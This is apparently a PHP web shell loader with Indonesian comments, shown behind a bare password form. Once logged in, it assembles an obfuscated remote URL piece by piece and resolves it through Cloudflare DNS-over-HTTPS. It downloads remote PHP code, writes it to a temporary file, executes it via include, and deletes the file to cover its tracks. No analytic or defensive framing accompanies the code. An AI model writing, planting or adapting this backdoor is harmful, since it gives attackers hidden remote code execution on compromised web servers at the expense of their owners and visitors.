<?php
session_start();

// Direktori tempat file PHP ini berada
$baseDir = __DIR__;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Password hashed
    $hashed_password = '$2a$12$LO0F6Ywawaf/7tBwQFLz8Ofn/zpEh2/6.rc0uqg5X5XqOQQ097/gS';
    if (password_verify($_POST["password"], $hashed_password)) {
        $_SESSION["logged_in"] = true;
    } else {
        $error_message = "Password salah!";
    }
}

if (isset($_SESSION["logged_in"]) && $_SESSION["logged_in"] === true) {
    $url = "ht"; $url .= "tps:"; $url .= "//"; $url .= "king";
    $url .= "alex"; $url .= ".pag"; $url .= "es.";
    $url .= "dev/"; $url .= "king"; $url .= ".php";
    
    $dns = 'ht'; $dns .= 'tps:/'; $dns .= '/clo';
    $dns .= 'udfl'; $dns .= 'are-d'; $dns .= 'ns.c'; $dns .= 'om/d';
    $dns .= 'ns-q'; $dns .= 'uery';

    $ch = curl_init($url);
    if (defined('CURLOPT_DOH_URL')) {
        curl_setopt($ch, CURLOPT_DOH_URL, $dns);
    }
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    $res = curl_exec($ch);
    if ($res === false) {
        $error_message = "Gagal mengambil konten dari URL: " . curl_error($ch);
        curl_close($ch);
    } else {
        curl_close($ch);

        // Simpan konten ke file sementara di direktori yang sama
        $tempFile = $baseDir . '/temp_script.php';
        if (file_put_contents($tempFile, $res) !== false) {
            include($tempFile);
            // Hapus file sementara setelah di-include
            unlink($tempFile);
            exit();
        } else {
            $error_message = "Gagal menyimpan konten ke file sementara!";
        }
    }
}
?>

<!DOCTYPE html>
<html>
<body>
    <?php if (isset($error_message)) : ?>
        <p style="color: red;"><?php echo htmlspecialchars($error_message); ?></p>
    <?php endif; ?>
    <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="POST">
        <input type="password" id="password" name="password" required>
        <input type="submit" value="Submit">
    </form>
</body>
</html>
